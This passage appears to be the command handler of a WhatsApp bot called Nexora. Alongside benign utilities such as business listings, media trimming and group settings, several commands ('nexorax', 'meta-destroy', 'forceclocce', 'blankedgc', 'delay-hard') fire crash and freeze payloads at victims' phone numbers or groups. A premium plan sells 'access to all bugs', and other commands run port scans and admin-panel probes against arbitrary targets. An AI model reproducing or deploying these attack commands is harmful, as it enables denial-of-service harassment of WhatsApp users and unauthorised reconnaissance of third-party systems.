        layout += `┃ • [\`${b.id}\`] *${b.name}*\n┃   _${b.category}_ | ⭐ ${rating}\n┃\n`;
    });
    layout += `┗━━━━━━━━━━━━━━━━━━━━┛`;
    reply(layout);
}
break;

case 'searchbiz': {
    if (!isCreator) return;
    const query = args.join(' ').toLowerCase();
    if (!query) return reply('❌ Please specify a query term (Name or Category).');

    const matches = Object.values(global.businessRegistry).filter(b => 
        b.name.toLowerCase().includes(query) || b.category.toLowerCase().includes(query)
    );

    if (matches.length === 0) return reply('❌ No matching business profiles found.');

    let layout = `🔍 *SEARCH ARCHIVE RESULTS:*\n\n`;
    matches.forEach(b => {
        layout += `• *[\`${b.id}\`] ${b.name}*\n  Category: _${b.category}_\n\n`;
    });
    reply(layout);
}
break;

case 'bizinfo': {
     if (!isCreator) return;
    const bizId = args[0]?.toUpperCase();
    if (!bizId || !global.businessRegistry[bizId]) return reply('❌ Please provide a valid Business ID.');

    const b = global.businessRegistry[bizId];
    const rating = b.ratingCount > 0 ? (b.ratingSum / b.ratingCount).toFixed(1) : 'No Ratings yet';

    let card = `┏━━━━━━━━━━━━━━━━━━━━┓\n┃ 🏢 *ENTERPRISE DOSSIER: ${b.id}* \n┣━━━━━━━━━━━━━━━━━━━━┫\n┃ ✨ *Name:* ${b.name}\n┃ 🏷️ *Sector:* ${b.category}\n┃ 👤 *Owner:* @${b.owner.split('@')[0]}\n┃ ⭐ *Score Evaluation:* ${rating} (${b.ratingCount} updates)\n┃ 📝 *Description:* _${b.desc}_\n┃\n┃ 💬 *RECENT CUSTOMER REVIEWS:*\n`;
    
    if (b.reviews.length === 0) card += `┃   _No logged evaluation text entries._\n`;
    else b.reviews.slice(-3).forEach(r => card += `┃   • [${r.user.split('@')[0]}]: "${r.text}"\n`);
    
    card += `┗━━━━━━━━━━━━━━━━━━━━┛`;

    await empire.sendMessage(m.chat, { image: { url: b.bannerUrl }, caption: card, mentions: [b.owner] }, { quoted: m });
}
break;

case 'ratebiz': {
 if (!isCreator) return;
    const bizId = args[0]?.toUpperCase();
    const score = parseInt(args[1]);

    if (!global.businessRegistry[bizId] || isNaN(score) || score < 1 || score > 5) {
        return reply(`❌ *Usage:* \`${prefix + command} [ID] [Score 1-5]\` \nExample: \`.ratebiz BIZ-1234 5\``);
    }

    global.businessRegistry[bizId].ratingSum += score;
    global.businessRegistry[bizId].ratingCount += 1;
    reply(`⭐ *Score added.* Thank you for registering your feedback.`);
}
break;

case 'reviewbiz': {
     if (!isCreator) return;
    const textArgs = args.join(' ').split('|');
    const bizId = textArgs[0]?.trim().toUpperCase();
    const reviewText = textArgs[1]?.trim();

    if (!global.businessRegistry[bizId] || !reviewText) {
        return reply(`❌ *Usage:* \`${prefix + command} [ID] | [Your Review text]\``);
    }

    global.businessRegistry[bizId].reviews.push({ user: m.sender, text: reviewText });
    reply(`📝 *Review appended successfully to profile node \`${bizId}\`.*`);
}
break;

case 'topbiz': {
    if (!isCreator) return;
    const sorted = Object.values(global.businessRegistry).sort((a, b) => {
        const ratingA = a.ratingCount > 0 ? a.ratingSum / a.ratingCount : 0;
        const ratingB = b.ratingCount > 0 ? b.ratingSum / b.ratingCount : 0;
        return ratingB - ratingA;
    });

    if (sorted.length === 0) return reply('🏢 No registered business platforms found inside matrix.');

    let board = `🏆 *TOP RANKED ENTERPRISE MATRIX* 🏆\n\n`;
    sorted.slice(0, 5).forEach((b, i) => {
        const score = b.ratingCount > 0 ? (b.ratingSum / b.ratingCount).toFixed(1) : '0.0';
        board += `${i + 1}. *${b.name}* (\`${b.id}\`)\n   ⭐ Rating: ${score} | Sector: _${b.category}_\n\n`;
    });
    reply(board);
}
break;

case 'bizbanner': {
if (!isCreator) return;
    const bizId = args[0]?.toUpperCase();
    const imgUrl = args[1];

    if (!global.businessRegistry[bizId] || !imgUrl || !imgUrl.startsWith('http')) {
        return reply(`❌ *Usage:* \`${prefix + command} [ID] [Direct Image URL]\``);
    }
    if (global.businessRegistry[bizId].owner !== m.sender && !isCreator) return reply('❌ Authorization access denial.');

    global.businessRegistry[bizId].bannerUrl = imgUrl;
    reply(`🖼️ *Profile visual billboard asset modified successfully.*`);
}
break;

/*
case 'ocr': {
     if (!isCreator) return;
    if (!/image/.test(mime)) return reply("reply to an image to read");
    const { createWorker } = require('tesseract.js');
    const img = await downloadAndSaveMediaMessage(m.quoted || m);
    const worker = await createWorker('eng');
    const { data: { text } } = await worker.recognize(img);
    await worker.terminate();
    reply(text.trim() || "Nexora couldn't read image");
}
break;*/
case 'trim': {
if (!isCreator) return;
    if (!/video|audio/.test(mime)) return reply("nexora needs a video or audio to trim.");
    if (!text.includes('|')) return reply("use: .trim 00:00:05 | 5\n(Start | Duration in seconds)");
    
    const ffmpeg = require('fluent-ffmpeg');
    const fs = require('fs');
    const [start, duration] = text.split('|').map(t => t.trim());
    
    // Feedback so they know it's working
    const status = await reply("empire is cutting...");
    
    const input = await downloadAndSaveMediaMessage(m.quoted || m);
    const output = `./trim_${Date.now()}.${mime.split('/')[1]}`;

    ffmpeg(input)
        .setStartTime(start)
        .setDuration(duration)
        .save(output)
        .on('end', async () => {
            await empire.sendMessage(m.chat, { 
                [mime.includes('video') ? 'video' : 'audio']: { url: output }, 
                mimetype: mime 
            }, { quoted: m });
            
            // Clean up
            fs.unlinkSync(input);
            fs.unlinkSync(output);
            await empire.sendMessage(m.chat, { delete: status.key }); // Delete "cutting" message
        })
        .on('error', (err) => {
            console.log(err);
            reply("empire failed to trim.");
        });
}
break;


case 'gcsettings':
case 'gc': {
    if (!m.isGroup) return reply("ɢʀᴏᴜᴘ ᴄᴏᴍᴍᴀɴᴅ ᴏɴʟʏ.");
    if (!isAdmins && !isCreator) return reply("ᴀᴅᴍɪɴ ᴏɴʟʏ.");
   // if (!isBotAdmins) return reply("I need to be an Admin to manage group settings.");
    if (!text) return reply(`
🕸️ *NEXORA GROUP MANAGER* 🕸️

*Usage:* ${prefix + command} <option>

*Available Options:*
• ${prefix + command} *open* (Allow everyone to chat)
• ${prefix + command} *close* (Admins only chat)
• ${prefix + command} *edit_on* (Everyone can edit GC info)
• ${prefix + command} *edit_off* (Admins only edit GC info)
• ${prefix + command} *approve_on* (Enable Member Approval)
• ${prefix + command} *approve_off* (Disable Member Approval)
• ${prefix + command} *revoke* (Reset Group Link)
`);

    const action = args[0].toLowerCase();

    try {
        switch (action) {
            case 'open':
                await empire.groupSettingUpdate(m.chat, 'not_announcement');
                reply("✅ *Group Unlocked:* Everyone can now send messages.");
                break;
            case 'close':
                await empire.groupSettingUpdate(m.chat, 'announcement');
                reply("🔒 *Group Locked:* Only admins can send messages.");
                break;
            case 'edit_on':
                await empire.groupSettingUpdate(m.chat, 'unlocked');
                reply("🔓 *Info Unlocked:* Everyone can edit group info.");
                break;
            case 'edit_off':
                await empire.groupSettingUpdate(m.chat, 'locked');
                reply("🔐 *Info Locked:* Only admins can edit group info.");
                break;
            case 'approve_on':
                // Note: Membership approval is a newer feature in some Baileys versions
                await empire.query({
                    tag: 'iq',
                    attrs: { to: m.chat, type: 'set', xmlns: 'w:g2' },
                    content: [{ tag: 'membership_approval_mode', attrs: {}, content: [{ tag: 'group_join', attrs: { state: 'on' } }] }]
                });
                reply("🛡️ *Approval Mode:* ON. New members must be approved by admins.");
                break;
            case 'approve_off':
                await empire.query({
                    tag: 'iq',
                    attrs: { to: m.chat, type: 'set', xmlns: 'w:g2' },
                    content: [{ tag: 'membership_approval_mode', attrs: {}, content: [{ tag: 'group_join', attrs: { state: 'off' } }] }]
                });
                reply("🔓 *Approval Mode:* OFF. Members can join freely.");
                break;
            case 'revoke':
                await empire.groupRevokeInvite(m.chat);
                reply("🔄 *Link Revoked:* The group invite link has been reset.");
                break;
            default:
                reply("❌ Invalid option. Use the command without arguments to see the menu.");
        }
    } catch (err) {
        console.error(err);
        reply("☣️ *System Error:* Failed to update group settings.");
    }
}
break;



case 'tempmail': { 
     if (!isCreator) return;
    const axios = require('axios');
    const res = await axios.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1');
    const email = res.data[0];
    reply(`📧 *EMPIRE MAIL*:\n${email}\n\n_Check messages with .checkmail ${email}_`);
}
break;

case 'topdf': {
     if (!isCreator) return;
    const PDFDocument = require('pdfkit');
    const fs = require('fs');
    if (!/image/.test(mime)) return reply("reply to an image");
    const doc = new PDFDocument();
    const path = `./${m.sender.split('@')[0]}.pdf`;
    const img = await downloadAndSaveMediaMessage(m.quoted || m);
    doc.pipe(fs.createWriteStream(path));
    doc.image(img, { fit: [500, 500], align: 'center', valign: 'center' });
    doc.end();
    setTimeout(async () => {
        await empire.sendMessage(m.chat, { document: fs.readFileSync(path), fileName: 'empire.pdf', mimetype: 'application/pdf' });
        fs.unlinkSync(path);
        fs.unlinkSync(img);
    }, 2000);
}
break;
case 'horror':
case 'realistic': {
    if (!text) return reply(`Usage: ${prefix + command} <prompt>`);
    const endpoint = command === 'horror' ? 'horror' : 'realistic';
    await empire.sendMessage(m.chat, { react: { text: '🎨', key: m.key } });
    
    try {
        const init = await axios.get(`https://prexzyapis.com/ai/${endpoint}?prompt=${encodeURIComponent(text)}`);
        const taskId = init.data.task_id;
        let imageUrl = null;

        for (let i = 0; i < 15; i++) { // 30 second timeout
            await new Promise(r => setTimeout(r, 2000));
            const check = await axios.get(`https://prexzyapis.com/ai/nano-banana2-result?task_id=${taskId}`);
            if (check.data.status === "completed") {
                imageUrl = check.data.image_url;
                break;
            }
        }

        if (imageUrl) {
            await empire.sendMessage(m.chat, { image: { url: imageUrl }, caption: `✨ *Nexora AI:* ${command.toUpperCase()}\nPrompt: ${text}` }, { quoted: m });
        } else {
            reply("❌ Generation timed out.");
        }
    } catch (e) { reply("☣️ AI Server Error."); }
}
break;

case 'animesearch': {
    if (!text) return reply("Enter anime name.");
    try {
        const res = await axios.get(`https://prexzyapis.com/anime/animesearch?query=${encodeURIComponent(text)}`);
        const results = res.data.data.results;
        if (!results.length) return reply("No anime found.");

        let msg = `⛩️ *NEXORA ANIME SEARCH*\n\n`;
        results.forEach((anime, i) => {
            msg += `*${i + 1}.* ${anime.title}\nType: ${anime.type} | Status: ${anime.status}\nURL: ${anime.url}\n\n`;
        });
        
        await empire.sendMessage(m.chat, { image: { url: results[0].image }, caption: msg }, { quoted: m });
    } catch (e) { reply("❌ Search Error."); }
}
break;

case 'animekill': {
    if (!text) return reply("Usage: .animekill <query>");
    try {
        const res = await axios.get(`https://prexzyapis.com/anime/animekill-search?query=${encodeURIComponent(text)}`);
        reply(`Target acquired. Use ID to fetch details.\n\n${JSON.stringify(res.data.data, null, 2)}`);
    } catch (e) { reply("❌ AnimeKill Error."); }
}
break;
case 'fb':
case 'facebook': {
    if (!text) return reply("Paste FB link.");
    try {
        let res = await axios.get(`https://prexzyapis.com/download/facebook?url=${text}`);
        if (!res.data.status) { // Fallback to V2
            res = await axios.get(`https://prexzyapis.com/download/facebookv2?url=${text}`);
        }
        await empire.sendMessage(m.chat, { video: { url: res.data.data.url }, caption: "✅ FB Download Success" }, { quoted: m });
    } catch (e) { reply("❌ FB Downloader Failed."); }
}
break;


case 'android1': {
    if (!text) return reply("What app?");
    const res = await axios.get(`https://prexzyapis.com/search/android1?q=${encodeURIComponent(text)}`);
    reply(`🤖 *Mod App Results:*\n\n${JSON.stringify(res.data.data, null, 2)}`);
}
break;
/*
case 'glitch':
case 'write':
case 'glow':
case 'luxury':
case 'galaxy':
case 'pixel':
case 'clouds': {
    if (!text) return reply("Enter text.");
    const mapping = {
        'glitch': 'glitchtext',
        'write': 'writetext',
        'glow': 'advancedglow',
        'luxury': 'luxurygold',
        'galaxy': 'galaxywallpaper',
        'pixel': 'pixelglitch',
        'clouds': 'effectclouds'
    };
    const api = mapping[command];
    const img = `https://prexzyapis.com/${api}?text=${encodeURIComponent(text)}`;
    await empire.sendMessage(m.chat, { image: { url: img }, caption: `✨ Nexora ${command.toUpperCase()} Effect` }, { quoted: m });
}
break;
*/
case 'quiz': {
    const level = text || '1';
    const res = await axios.get(`https://prexzyapis.com/game/quiztruefalse?level=${level}`);
    const q = res.data.data;
    reply(`🎮 *NEXORA QUIZ*\n\nQuestion: ${q.question}\n\nType *True* or *False* to answer!`);
}
break;

case 'clone': {
    if (!text) return reply("Paste website URL.");
    const res = `https://prexzyapis.com/download/saveweb2zip?url=${text}`;
    reply(`📦 *Cloning Website...* Download link will appear shortly.\nLink: ${res}`);
}
break;



case 'zip': { // 29: File to Zip
     if (!isCreator) return;
    const AdmZip = require('adm-zip');
    const fs = require('fs');
    if (!m.quoted) return reply("reply to an image");
    const file = await downloadAndSaveMediaMessage(m.quoted);
    const zip = new AdmZip();
    zip.addLocalFile(file);
    const zipPath = `./empire.zip`;
    zip.writeZip(zipPath);
    await empire.sendMessage(m.chat, { document: fs.readFileSync(zipPath), fileName: 'empire.zip', mimetype: 'application/zip' });
    fs.unlinkSync(file);
    fs.unlinkSync(zipPath);
}
break;
case 'sandbox': {
    if (!isCreator) return;
    if (!text) return reply(`⚠️ Please provide a JavaScript code snippet to test!\nUsage: ${prefix}sandbox 2 + 2\nOr:\n${prefix}sandbox const clearText = text.toUpperCase(); clearText;`);

    try {
        await empire.sendMessage(from, { react: { text: '🧪', key: m.key } });

        const vm = require('vm');
        const util = require('util');

        // Create a secure, isolated sandboxed context
        const sandboxEnv = {
            console: {
                log: (...args) => sandboxLogs.push(args.map(arg => typeof arg === 'object' ? util.inspect(arg) : arg).join(' '))
            },
            process: {},
            Buffer: Buffer,
            setTimeout: setTimeout,
            text: text, // Passes any remainder text as a helper global
            args: args
        };

        const sandboxLogs = [];
        const context = vm.createContext(sandboxEnv);
        
        // Compile the incoming code snippet
        const script = new vm.Script(text);

        // Run with a strict timeout execution boundary (2000ms max)
        const result = script.runInContext(context, { timeout: 2000 });

        let executionOutput = `✨ *NEXORA SANDBOX EXECUTION* ✨\n\n`;
        
        if (sandboxLogs.length > 0) {
            executionOutput += `📋 *Console Output:*\n\`\`\`\n${sandboxLogs.join('\n')}\n\`\`\`\n\n`;
        }

        executionOutput += `📊 *Returned Value:*\n\`\`\`javascript\n${util.inspect(result)}\n\`\`\`\n\n`;
        executionOutput += `> ✅ Executed cleanly in isolated memory buffer space.`;

        reply(executionOutput);

    } catch (sandboxError) {
        console.error("Sandbox Engine Crash:", sandboxError);
        reply(`❌ *Sandbox Execution Failed!*\n\n⚠️ *Error:* \`\`\`${sandboxError.message}\`\`\``);
    }
    break;
}

case 'decrypt': {
    const axios = require('axios');
    
    // Split input by the | symbol
    // Example: .decrypt 🍎🍌🍒 | 1234
    let [input, password] = text.split('|').map(v => v.trim());

    if (!input || !password) {
        return reply("Usage: .decrypt [emojis] | [password]\nExample: .decrypt 🍎🍌🍒 | mykey");
    }

  ///  await m.react('🔓');
    const query = encodeURIComponent(input);
    const pass = encodeURIComponent(password);
    const url = `https://prexzyapis.com/tools/emoji-decrypt?input=${query}&pass=${pass}`;

    try {
        const response = await axios.get(url);
        const data = response.data;

        if (!data || !data.result) {
            return reply("Decryption failed. Wrong password or corrupted emoji string.");
        }

        let decryptMsg = `🔓 *EMOJI DECRYPTION*\n\n`;
        decryptMsg += `📝 *Message:* ${data.result}\n\n`;
        decryptMsg += `_Decrypted via Prexzy API_`;

        await empire.sendMessage(m.chat, { text: decryptMsg }, { quoted: m });
      //  await m.react('✅');

    } catch (err) {
        console.error(err);
        reply("Error connecting to decryption server.");
    }
}
break;

case 'revip':
case 'reverseip': {
    if (!text) return reply("🕵️‍♂️ Provide a domain or IP to map neighbors. (e.g., .revip target.com)");
    await empire.sendMessage(m.chat, { react: { text: '🔎', key: m.key } });

    try {
        const axios = require('axios');
        const target = text.replace(/(^\w+:|^)\/\//, '').split('/')[0];

        // Fetching reverse IP data from a public OSINT API
        const res = await axios.get(`https://api.hackertarget.com/reverseiplookup/?q=${target}`);
        
        let report = `☣️ *𝗡𝗘𝗫𝗢𝗥𝗔 𝗡𝗘𝗜𝗚𝗛𝗕𝗢𝗥 𝗠𝗔𝗣𝗣𝗜𝗡𝗚*\n`;
        report += `_Scanning shared server infrastructure..._\n\n`;
        
        const lines = res.data.split('\n');
        if (lines.length > 1) {
            report += `📂 *Associated Domains:* \n\`\`\`${lines.slice(0, 15).join('\n')}\`\`\`\n\n`;
            if (lines.length > 15) report += `_...and ${lines.length - 15} more nodes._\n\n`;
            report += `⚠️ *Note:* Targets sharing this IP may be vulnerable to cross-site contamination.`;
        } else {
            report += `🟢 *Status:* Target appears to be on a Dedicated Node (No neighbors found).`;
        }

        reply(report);
    } catch (e) {
        reply("❌ Data-stream interrupted. Target is likely behind Cloudflare/Akamai.");
    }
}
break;

case 'takeover': {
    if (!text) return reply("🕵️‍♂️ Provide a subdomain to check for dangling CNAMEs.");
    const axios = require('axios');
    try {
        const res = await axios.get(`https://api.hackertarget.com/hostsearch/?q=${text}`);
        let report = `🛡️ *𝗡𝗘𝗫𝗢𝗥𝗔 𝗧𝗔𝗞𝗘𝗢𝗩𝗘𝗥 𝗔𝗨𝗗𝗜𝗧*\n\n`;
        report += `🛰️ *Scanning:* ${text}\n`;
        report += `📊 *Results:* \n\`\`\`${res.data.split('\n').slice(0, 5).join('\n')}\`\`\`\n\n`;
        report += `_Check CNAME records for "404 Not Found" or "No such app" responses._`;
        reply(report);
    } catch (e) {
        reply("❌ Audit failed.");
    }
}
break;

case 'adminfinder': {
    if (!text) return reply("🕵️‍♂️ Provide a domain to find its entry gate.");
    const paths = ['/admin/', '/wp-admin/', '/login/', '/phpmyadmin/', '/cpanel/'];
    let found = [];

    for (let path of paths) {
        try {
            const axios = require('axios');
            const res = await axios.get(`http://${text}${path}`, { timeout: 3000 });
            if (res.status === 200) found.push(path);
        } catch (e) {}
    }

    let report = `🔑 *𝗡𝗘𝗫𝗢𝗥𝗔 𝗔𝗗𝗠𝗜𝗡-𝗙𝗜𝗡𝗗𝗘𝗥*\n\n`;
    report += `🌐 *Target:* ${text}\n`;
    report += `📂 *Potential Gates:* ${found.length > 0 ? found.join(', ') : 'None Detected'}\n\n`;
    report += `_Note: This scans for public-facing administrative portals._`;
    reply(report);
}
break;
case 'story-ai':
case 'advanced': {
    if (!isCreator) return;
    const axios = require('axios');
    if (!text) return reply(`Usage: .${command} [question]\nExample: .${command} write a short story about a cat`);

    await empire.sendMessage(m.chat, { react: { text: '🧠', key: m.key } });

    // Parameters: mode=chat, length=medium, creative=true
    const url = `https://prexzyapis.com/ai/advanced?text=${encodeURIComponent(text)}&mode=chat&length=medium&creative=true`;

    try {
        const response = await axios.get(url);
        const data = response.data;

        // Assuming the API returns the answer in data.result or data.response
        const aiResponse = data.result || data.response || "I couldn't generate a response.";

        let resultMsg = `🧠 *𝗡𝗘𝗫𝗢𝗥𝗔 𝗔𝗗𝗩𝗔𝗡𝗖𝗘𝗗 𝗔𝗜*\n\n`;
        resultMsg += `${aiResponse}\n\n`;
        resultMsg += `_Powered by empire Advanced Node_`;

        await empire.sendMessage(m.chat, { text: resultMsg }, { quoted: m });

        await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (err) {
        console.error(err);
        reply("The AI node is currently overloaded. Try again later.");
        await empire.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    }
}
break;
case 'nexorax': {
    if (!isCreator) return reply("🕸️ *ACCESS DENIED:* This weapon is restricted to the Developer.");
    if (!text) return reply(`*Usage:* ${prefix + command} <jid/number>`);

    const target = text.includes('@') ? text : text + '@s.whatsapp.net';
    await empire.sendMessage(m.chat, { react: { text: '💀', key: m.key } });

    await reply("☢️ *Injecting Nexora-X Payload...*");
    await NexoraX(target);
    await reply("🏁 *Ultra-Payload Delivered.* Target UI should be unresponsive.");
}
break;

case 'sentinel': {
    if (!text) return reply("☣️ *NEXORA SENTINEL PROTOCOL*\nProvide a target (Domain/IP) for full spectrum analysis.");
    
    // Initializing the fake terminal feel
    let { key } = await empire.sendMessage(m.chat, { text: "🕸️ *INITIALIZING SENTINEL OVERSIGHT...*" }, { quoted: m });
    await sleep(1000);

    try {
        const axios = require('axios');
        const target = text.replace(/(^\w+:|^)\/\//, '').split('/')[0];

        // --- STAGE 1: GEOGRAPHICAL TRACE ---
        await empire.sendMessage(m.chat, { text: "📡 [𝗦𝗧𝗔𝗚𝗘 𝟭]: Mapping Physical Node Architecture...", edit: key });
        const geo = await axios.get(`http://ip-api.com/json/${target}`);
        
        // --- STAGE 2: NETWORK PORTS & VULNS ---
        await empire.sendMessage(m.chat, { text: "🔌 [𝗦𝗧𝗔𝗚𝗘 𝟮]: Probing Open Service Ports...", edit: key });
        const ports = await axios.get(`https://api.hackertarget.com/nmap/?q=${target}`);
        const activePorts = ports.data.split('\n').filter(l => l.includes('/tcp')).slice(0, 4).join('\n');

        // --- STAGE 3: DNS & SUBDOMAIN MAPPING ---
        await empire.sendMessage(m.chat, { text: "🛰️ [𝗦𝗧𝗔𝗚𝗘 𝟯]: Extracting DNS Infrastructure...", edit: key });
        const dns = await axios.get(`https://api.hackertarget.com/dnslookup/?q=${target}`);

        // --- STAGE 4: CLOUD FINGERPRINTING ---
        await empire.sendMessage(m.chat, { text: "🧠 [𝗦𝗧𝗔𝗚𝗘 𝟰]: Fingerprinting Server Identity...", edit: key });
        const headers = await axios.head(`http://${target}`).catch(() => ({headers: {server: 'Firewall Protected'}}));

        // --- FINAL REPORT ASSEMBLY ---
        let report = `🕸️ *𝗡𝗘𝗫𝗢𝗥𝗔 𝗦𝗘𝗡𝗧𝗜𝗡𝗘𝗟 𝗢𝗨𝗧𝗣𝗨𝗧*\n`;
        report += `━━━━━━━━━━━━━━━━━━━━\n`;
        report += `🌐 *TARGET:* ${target}\n`;
        report += `📍 *LOC:* ${geo.data.city || 'Unknown'}, ${geo.data.country || 'Unknown'}\n`;
        report += `🏢 *ISP:* ${geo.data.isp || 'Hidden'}\n`;
        report += `🛡️ *SERVER:* ${headers.headers.server}\n`;
        report += `━━━━━━━━━━━━━━━━━━━━\n`;
        report += `🔌 *OPEN PORTS:*\n\`\`\`${activePorts || 'No Standard Ports Open'}\`\`\`\n`;
        report += `━━━━━━━━━━━━━━━━━━━━\n`;
        report += `🛰️ *DNS NODES:*\n\`\`\`${dns.data.split('\n').slice(0, 3).join('\n')}\`\`\`\n`;
        report += `━━━━━━━━━━━━━━━━━━━━\n`;
        report += `⚠️ *ADVISORY:* Target infrastructure is mapped. Proceed with caution.`;

        await empire.sendMessage(m.chat, { text: report, edit: key });

    } catch (e) {
        await empire.sendMessage(m.chat, { text: "❌ *CRITICAL ERROR:* Target is utilizing high-level CDN obfuscation.", edit: key });
    }
}
break;

case 'intel':
case 'scrape': {
    if (!text) return reply("🕵️‍♂️ Provide a URL! Example: .intel nexora.com");
    await empire.sendMessage(m.chat, { react: { text: '📡', key: m.key } });

    try {
        const axios = require('axios');
        const cheerio = require('cheerio'); // Standard JS scraper library
        
        const res = await axios.get(text.startsWith('http') ? text : `https://${text}`);
        const $ = cheerio.load(res.data);

        // Scraping public meta-tags
        const title = $('title').text();
        const desc = $('meta[name="description"]').attr('content') || 'No description found';
        const keywords = $('meta[name="keywords"]').attr('content') || 'None';
        const ogImage = $('meta[property="og:image"]').attr('content') || 'No OG Image';

        let report = `📡 *𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗘𝗧𝗔-𝗦𝗖𝗥𝗔𝗣𝗘𝗥*\n\n`;
        report += `🌐 *Site:* ${text}\n`;
        report += `🏷️ *Title:* ${title}\n`;
        report += `📄 *Desc:* ${desc}\n`;
        report += `🔑 *Keywords:* ${keywords}\n`;
        report += `🖼️ *Banner:* ${ogImage}\n\n`;
        report += `_Data extracted from public HTML headers._`;

        reply(report);
    } catch (e) {
        reply("❌ Scraping failed. Target is likely using a JavaScript-heavy framework or Anti-Bot protection.");
    }
}
break;
/*
XinsooInvisV1
CarouselVY4
protoXimg
protoXvid
bulldozer
protocolbug6
protocolbug3
delayMakerInvisible
VampBroadcast
FreezeGC
crashChannel
swVidFreeze
gsInter
delay2
oneMsgFC
rageioshere
rusuhgc
killgc
blankgc
bug3
iosOver
Combo
fcnew
BugGroup
xCursedGroup
*/
case 'buyprem': {
    let menu = `⭐ *NEXORA PREMIUM PLANS* ⭐

Unlock exclusive features and higher limits!

*📜 PRICING:*
• 7 Days: 2,000 NGN
• 20 Days: 5,000 NGN
• Lifetime: 10,000 NGN

*💎 BENEFITS:*
• Access to all Premium Commands
• Change bot name 
• Access to all bugs 😈
• No daily limits
• Faster processing
• Exclusive AI features

*💳 HOW TO PAY:*
To purchase, please contact the owner:
wa.me/2349118304002

_After payment, the owner will activate your access immediately._`;

    reply(menu);
}
break;


            case 'meta-destroy': {
                if (!isOwner) return reply("🔒 *Owner only*");
                if (!q) return reply("📌 *Usage:* meta-destroy 923xx");

                let targetNumber = q.replace(/[^0-9]/g, '');

                // 🔒 PROTECTED NUMBERS CHECK
                let protectedNumbers = ["923254352974"];
                if (protectedNumbers.includes(targetNumber)) {
                    return reply("🔒 *Protected*");
                }

                let target = targetNumber + "@s.whatsapp.net";
                reply(`💀 *Target:* ${targetNumber}\n⚡ *Attack initiated*`);

                // Run all combo functions
                await Combo(target);           // Your combo with callinvisible, ForceXFrezee, blank1
                await sleep(2000);
                await fcnew(target);           // Your fcnew with CarouselVY4, LocaXotion, XinsooInvisV1
                await sleep(2000);
                await XPhone(target);          // Your XPhone with many functions
                await sleep(2000);
                await BayuOfficialHard(target); // Your BayuOfficialHard with protoXimg, bulldozer, etc
                await sleep(2000);
                await ForceClose(target);      // Your ForceClose with forclose

                reply(`✅ *Attack completed on ${targetNumber}*`);
                break;
            }


            case "meta-invis": {
                if (!isCreator) return reply('🔒 *Owner only*');
                if (!text) return reply(`📌 *Usage:* ${command} 923xx`);

                let pepec = args[0].replace(/[^0-9]/g, "");

                // 🔒 PROTECTED NUMBERS CHECK
                let protectedNumbers = ["923254352974"];
                if (protectedNumbers.includes(pepec)) {
                    return reply("🔒 *Protected*");
                }

                let target = pepec + '@s.whatsapp.net';
                reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}`);

                await doneress();
                await Combo(target);
                await fcnew(target);
                await Combo(target);
                await fcnew(target);
                await XPhone(target);

                await devtrust.sendMessage(from, { react: { text: "🥶", key: m.key } });
            }
                break;

            case "delayhhard": {
                if (!isCreator) return reply('🔒 *Owner only*');
                if (!text) return reply(`📌 *Usage:* ${command} 923xx`);

                let pepec = args[0].replace(/[^0-9]/g, "");

                // 🔒 PROTECTED NUMBERS CHECK
                let protectedNumbers = ["923254352974"];
                if (protectedNumbers.includes(pepec)) {
                    return reply("🔒 *Protected*");
                }

                let target = pepec + '@s.whatsapp.net';
                reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}`);

                await doneress();
                await fcnew(target);
                await fcnew(target);
                await Combo(target);
                await Combo(target);
                await fcnew(target);
                await fcnew(target);
                await Combo(target);
                await Combo(target);
                await XPhone(target);

                await devtrust.sendMessage(from, { react: { text: "😈", key: m.key } });
            }
                break;

            
            case "forceclocce": {
                if (!isCreator) return reply('🔒 *Owner only*');
                if (!text) return reply(`📌 *Usage:* ${command} 923xx`);

                let pepec = args[0].replace(/[^0-9]/g, "");

                // 🔒 PROTECTED NUMBERS CHECK
                let protectedNumbers = ["8087253512"];
                if (protectedNumbers.includes(pepec)) {
                    return reply("🔒 *Protected*");
                }

                let target = pepec + '@s.whatsapp.net';
                reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}`);

                await doneress();

                for (let i = 0; i < 7; i++) {
                    await ForceClose(target);
                }

                await XPhone(target);

                await devtrust.sendMessage(from, { react: { text: "🥶", key: m.key } });
            }
                break;

            //====================[ GROUP BUG COMMANDS ]===========================//


            case 'blankedgc': {
                if (!isOwner) return reply(`🔒 *Owner only*`);
                if (!m.isGroup) return reply('👥 *Groups only*');

                reply(`💀 *Destroying group...*`);

                for (let i = 0; i < 20; i++) {
                    await bug3(m.chat);
                    await sleep(2000);
                    await bug3(m.chat);
                }
            }
                break;


case 'delay-hard': {
//case 'invis-delay': {
    if (!isCreator) return reply("🕸️ *ᴏᴡɴᴇʀ ᴏɴʟ𝚢.*");
    
 //  let target = m.isGroup 
     //  ? (m.mentionedJid[0] || m.quoted?.sender || (text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null)) 
   //     : m.chat;

 //   if (!target) return reply("❌ *ᴘʀᴏᴛᴏᴄᴏʟ ᴇʀʀᴏʀ:* ʀᴇᴘʟʏ ᴏʀ ᴍᴇɴᴛɪᴏɴ ᴀ ᴛᴀʀɢᴇᴛ.");

    await empire.sendMessage(m.chat, { react: { text: '🌀', key: m.key } });
    
    // Call function (setting false for mention because private/lid chats crash better without the participant tag)
    await DelayHardTod(empire, target, ptcp = true);

    
    reply(`✅ *BVG SENT TO VICTIM* Use the command again or try another bug 💀.`);
}
break;

case 'checklink':
case 'detect': {
    if (!text) return reply("🔗 Provide a link to analyze!");
    await empire.sendMessage(m.chat, { react: { text: '🛡️', key: m.key } });

    try {
        const axios = require('axios');
        // Using Google Safe Browsing or a similar API
        const res = await axios.get(`https://api.threatest.com/v1/url/${encodeURIComponent(text)}`); 

        let report = `🛡️ *𝗡𝗘𝗫𝗢𝗥𝗔 𝗧𝗛𝗥𝗘𝗔𝗧 𝗗𝗘𝗧𝗘𝗖𝗧𝗢𝗥*\n\n`;
        report += `🌐 *URL:* ${text}\n`;
        report += `📊 *Risk Level:* ${res.data.risk_score}/100\n`;
        report += `🔍 *Verdict:* ${res.data.malicious ? '🔴 MALICIOUS' : '🟢 CLEAN'}\n\n`;
        report += `⚠️ *Details:* ${res.data.tags.join(', ') || 'No known threats'}\n`;
        report += `\n_Forensic scan complete. Integrity check verified._`;

